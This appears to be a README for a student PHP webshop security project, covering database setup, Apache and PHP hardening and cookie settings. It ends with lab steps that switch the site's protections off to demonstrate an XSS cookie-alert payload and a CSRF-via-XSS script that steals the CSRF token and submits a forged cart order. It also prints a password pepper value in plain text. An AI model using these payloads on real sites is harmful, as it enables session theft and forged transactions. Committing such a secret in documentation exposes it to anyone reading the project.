# web_security

## Database Setup

### Accessing Your Database in phpMyAdmin:

1. **Open phpMyAdmin:**
   - Navigate to `http://localhost/phpmyadmin` in your browser.
   
2. **Select Database:**
   - Click on your `webshop_db` database to select it.
   
3. **Navigate to SQL Tab:**
   - In your database, click on the "SQL" tab at the top of the phpMyAdmin interface for SQL queries.

### Writing and Executing SQL Queries:

- In the SQL query text area, write your SQL commands to create tables.
- Example SQL commands to create tables:

```sql
CREATE TABLE users (
    user_id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    address TEXT NOT NULL
);

CREATE TABLE products (
    product_id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    description TEXT,
    price DECIMAL(10, 2) NOT NULL,
    stock INT NOT NULL,
    image VARCHAR(255)
);

CREATE TABLE orders (
    order_id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    order_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    total DECIMAL(10, 2) NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users(user_id)
);

CREATE TABLE order_items (
    order_item_id INT AUTO_INCREMENT PRIMARY KEY,
    order_id INT NOT NULL,
    product_id INT NOT NULL,
    quantity INT NOT NULL,
    price DECIMAL(10, 2) NOT NULL,
    FOREIGN KEY (order_id) REFERENCES orders(order_id),
    FOREIGN KEY (product_id) REFERENCES products(product_id)
);
```

- After typing each SQL command, click the "Go" button in phpMyAdmin to execute the query.

### Test Connection:

- Visit `https://localhost/webshop/test_connection.php` to test database connection.

### Sample Data Insertion:

```sql
INSERT INTO products (name, description, price, stock, image) VALUES 
('First Product', 'Description for first product', 99.99, 10, '1.png'),
('Second Product', 'Description for second product', 149.99, 5, '2.png'),
('Third Product', 'Description for Third product', 49.99, 5, '3.png'),
('Fourth Product', 'Description for Fourth product', 49.99, 0, '4.png');
```

-------------------------------
### Password Handling:

- Use a pepper for added security: `kQa9e4v8Jy3Cf1u5Rm7N0w2Hz8G6pX`.
- The `password_hash` function should concatenate the password with the pepper, generate a random salt, hash the concatenated string with the salt, and return the complete hash string.

### Brute Force Attack Mitigation:

- Implement a strategy to mitigate brute-force attacks by tracking consecutive failed login attempts and imposing delays after a threshold is reached.

- After each failed login attempt, increment a counter in the user's session or database.
- If the counter exceeds a certain number (e.g., 3 attempts), record the time of the last failed attempt.
- When the user tries to log in, check the time of the last failed attempt. If it was less than 30 minutes ago and the counter -is over the threshold, deny the login attempt.
- If the login is successful, reset the counter.

--------------------------------
## Server and PHP configuration and protection from attacks
**Protection from attacks**: Giving an attacker specific information about version
  numbers will greatly simplify the process of attacking the server. In Apache, the
  directive ServerTokens is used to control what information is given to clients.<br>
  ServerTokens Prod Apache<br>
  ServerTokens Major Apache/2<br>
  ServerTokens Minor Apache/2.2<br>
  ServerTokens Min Apache/2.2.14<br>
  ServerTokens OS Apache/2.2.14 (Ubuntu)<br>
  ServerTokens Full Apache/2.2.14 (Ubuntu) PHP/5.3.2-1ubuntu4.9<br>
**Action**: change the conf "ServerTokens Full" to "ServerTokens Prod"<br>
**How**: go to C:\xampp\apache\conf\extra\httpd-default.conf and change the line "ServerTokens Full" to "ServerTokens Prod"<br><br>

**Protection from attack**: PHP will by default send information about the fact that PHP is used and which version. It can be valuable information for an attacker.
  <br>**Action**: By default, an X-Powered-By header is added to the HTTP response, specifying the PHP version in use. This information can be suppressed using the expose php = Off directive. Some combinations are given below.<br>
  **How**: go to following files and change the line "expose_php = On" to "expose_php = Off"<br>
  "C:\xampp\php\php.ini" and "C:\xampp\php\php.ini-development" and "C:\xampp\php\windowsXamppPhp\php.ini-development" and "C:\xampp\php\php.ini-production" and "C:\xampp\php\windowsXamppPhp\php.ini-production"
  <br><br>

**Protection from attack**: once the application is in production, errors reporting should be turned off. Errors can give valuable information to an attacker, e.g., file paths, file names, uninitialized variables, and arguments to functions, which in the worst case could include passwords to databases used.
  <br>**Action**: Error reporting is controlled in php.ini. The directive display errors specifies if errors should be displayed on the screen. This defaults to On but should be turned off in production stage.
  <br>**How**: go to following files and change the line "display_errors = On" to "display_errors = Off"
  <br>"C:\xampp\php\php.ini" and "C:\xampp\php\php.ini-development" and "C:\xampp\php\windowsXamppPhp\php.ini-development" and "C:\xampp\php\php.ini-production" and "C:\xampp\php\windowsXamppPhp\php.ini-production"
  <br><br>**Protection from attack**: Instead, errors should be logged to a file.
  <br>**Action**: This can be done by setting log errors = On and specifying the file to log to using the directive error log.
  <br>**How**: go to following files and change the line "log_errors = Off" to "log_errors = On"
  <br>"C:\xampp\php\php.ini" and "C:\xampp\php\php.ini-development" and "C:\xampp\php\windowsXamppPhp\php.ini-development" and "C:\xampp\php\php.ini-production" and "C:\xampp\php\windowsXamppPhp\php.ini-production"
  <br><br>Additionally, go to C:\xampp\php and create a file called "logs" and in that file create a file called "php_errors_log.txt"
  Then go to following files and change the line "error_log = php_errors_log" to "error_log = C:\xampp\php\logs\php_errors_log.txt"



**Wither or not to add the httpOnly flag to the cookie, which makes it
  inaccessible to browser scripting languages such as JavaScript.
  session.cookie_httponly=1**
**Wither or not to add the secure flag to the cookie, which makes it only
  accessible over a secure connection such as HTTPS.
  session.cookie_secure =1**

**The SameSite cookie attribute can prevent the browser from sending cookies along
  with cross-site requests. This can be useful to mitigate CSRF (Cross-Site Request Forgery) attacks
  session.cookie_samesite="Strict"**



**Another protection is of course to not allow the session ID to be sent in
  the URL at all. This is accomplished using session.use only cookies = 1**


--------------------------------
## To see example How the attack can work and the code can be vulnerable to it, do the following:
### XSS attack: 
1. Go to the search.php and comment the lines 89 and 107 and remove the comments from lines 90,108.
2. Go to  any page and enter the following in the search field: <script>alert(document.cookie)</script>
3. Click on the login button and you will see a pop up with the cookie information.

### CSRF attack: 
1. Go to the cart.php and comment the lines 2-6.
2. Go to the index.php and comment the lines 3-5 , 8-12, 27-31 and 116. 
3. Go to the search.php and comment the lines 3-5 , 19-21, 27-31 and 67. 
4. Go to Csrf.html and modify "webSecurityProject" to your project localhost name.
5. Open CSRF.html and click on the button and you will see that the cart is updated with the product.

### CSRF using XSS attack:
1. Go to the cart.php and comment the lines 2-6.
2. Go to the index.php and comment the lines 3-5 , 8-12, 27-31 and 116.
3. Go to the search.php and comment the lines 3-5 , 19-21, 27-31 and 67.
4. 
```
  <script>
    
        /* Fetch the CSRF token */
        var tokenElement = document.querySelector('input[name="csrf_token"]');
        if (!tokenElement) {
            console.error('CSRF token element not found.');
        } else {
            var token = tokenElement.value;

            /* Create a new form */
            var form = document.createElement('form');
            form.action = 'http://localhost/webSecurityProject/index.php';
            form.method = 'POST';

            /* Create the hidden input fields */
            var product_id = document.createElement('input');
            product_id.type = 'hidden';
            product_id.name = 'product_id';
            product_id.value = '1';

            var product_price = document.createElement('input');
            product_price.type = 'hidden';
            product_price.name = 'product_price';
            product_price.value = '10000.00';
            
            var add_to_cart = document.createElement('input');
            add_to_cart.type = 'hidden';
            add_to_cart.name = 'add_to_cart';

            var csrf_token = document.createElement('input');
            csrf_token.type = 'hidden';
            csrf_token.name = 'csrf_token';
            csrf_token.value = token;

            /* Append the input fields to the form */
            form.appendChild(product_id);
            form.appendChild(product_price);
            form.appendChild(add_to_cart);
            form.appendChild(csrf_token);

            /* Append the form to the body */
            document.body.appendChild(form);

            /* Submit the form */
            form.submit();
        };
</script>
